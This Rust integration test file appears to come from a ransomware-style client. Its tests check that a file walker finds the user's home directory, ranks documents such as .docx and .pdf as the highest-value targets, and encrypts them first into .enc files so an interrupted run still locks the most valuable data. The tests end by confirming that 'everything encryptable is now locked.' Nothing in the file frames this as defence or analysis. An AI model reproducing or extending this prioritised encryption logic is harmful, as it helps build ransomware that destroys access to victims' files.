//! Integration tests for the `priority-scan` feature (SCAN_PRIORITY_PLAN.md).
//! Only compiled when `--features priority-scan` is passed — the `[[test]]`
//! entry in Cargo.toml sets `required-features`, so a default `cargo test`
//! neither compiles nor runs any of this.

#![cfg(feature = "priority-scan")]
// `mod common` defines more helpers than this test crate uses.
#![allow(dead_code)]

mod common;

use std::path::Path;

use client_lib::walker::{self, FileEntry};
use tempfile::TempDir;

fn write(dir: &Path, rel: &str, content: &[u8]) {
    let p = dir.join(rel);
    std::fs::create_dir_all(p.parent().unwrap()).unwrap();
    std::fs::write(&p, content).unwrap();
}

#[test]
fn inventory_plus_sort_yields_priority_order() {
    let dir = TempDir::new().unwrap();
    // Scrambled on purpose: order must come from sorting, not walk order.
    write(dir.path(), "d.mp3", b"dddd");    // tier 2
    write(dir.path(), "a.pdf", b"a");       // tier 0
    write(dir.path(), "e.docx", b"eeeee");  // tier 0, larger than a.pdf
    write(dir.path(), "b.xyz", b"bb");      // tier 3
    write(dir.path(), "c.zip", b"ccc");     // tier 1

    let entries = walker::inventory(&[dir.path().to_path_buf()]);
    assert_eq!(entries.len(), 5);
    assert!(entries.iter().all(|e| !e.deferred));

    let mut entries = entries;
    walker::sort_priority(&mut entries);
    let keys: Vec<(u8, u64)> = entries.iter().map(|e| (e.tier, e.size)).collect();
    let mut expected = keys.clone();
    expected.sort();
    assert_eq!(keys, expected, "entries must be ordered by (tier, size): {:?}", keys);
    // Sanity: the smallest tier-0 file sorts first within its tier.
    assert_eq!(entries[0].path.file_name().unwrap().to_str().unwrap(), "a.pdf");
}

#[test]
fn partial_run_encrypts_tier0_before_higher_tiers() {
    let dir = TempDir::new().unwrap();
    write(dir.path(), "docs/report.docx", b"high value");
    write(dir.path(), "docs/plan.pdf", b"another doc");
    write(dir.path(), "media/song.mp3", b"media tier 2");
    write(dir.path(), "code/main.rs", b"code tier 1");
    write(dir.path(), "misc/blob.bin", b"low tier 3");
    write(dir.path(), "media/photo.png", b"excluded");

    let entries = walker::inventory(&[dir.path().to_path_buf()]);
    // photo.png is excluded by the EXTENSIONS set.
    assert_eq!(entries.len(), 5);

    let key = common::random_key();

    // Simulate an interrupted run: only tier 0 is encrypted.
    let tier0: Vec<FileEntry> = entries.iter().filter(|e| e.tier == 0).cloned().collect();
    let n0 = walker::encrypt_priority(tier0, &key);
    assert_eq!(n0, 2);

    assert!(dir.path().join("docs/report.docx.enc").exists());
    assert!(dir.path().join("docs/plan.pdf.enc").exists());
    assert!(!dir.path().join("code/main.rs.enc").exists());
    assert!(!dir.path().join("media/song.mp3.enc").exists());
    assert!(!dir.path().join("misc/blob.bin.enc").exists());

    // Complete the run: everything encryptable is now locked.
    let total = walker::encrypt_priority(entries, &key);
    assert_eq!(total, 5);
    assert!(dir.path().join("code/main.rs.enc").exists());
    assert!(dir.path().join("media/song.mp3.enc").exists());
    assert!(dir.path().join("misc/blob.bin.enc").exists());
}

#[test]
fn discover_roots_covers_home() {
    let roots = walker::discover_roots();
    assert!(!roots.is_empty(), "discover_roots returned nothing");
    let home = std::env::var("USERPROFILE").or_else(|_| std::env::var("HOME"));
    if let Ok(home) = home {
        let home = Path::new(&home);
        assert!(
            roots
                .iter()
                .any(|r| r == home || home.starts_with(r) || r.starts_with(home)),
            "roots {:?} should cover home {:?}",
            roots,
            home
        );
    }
}
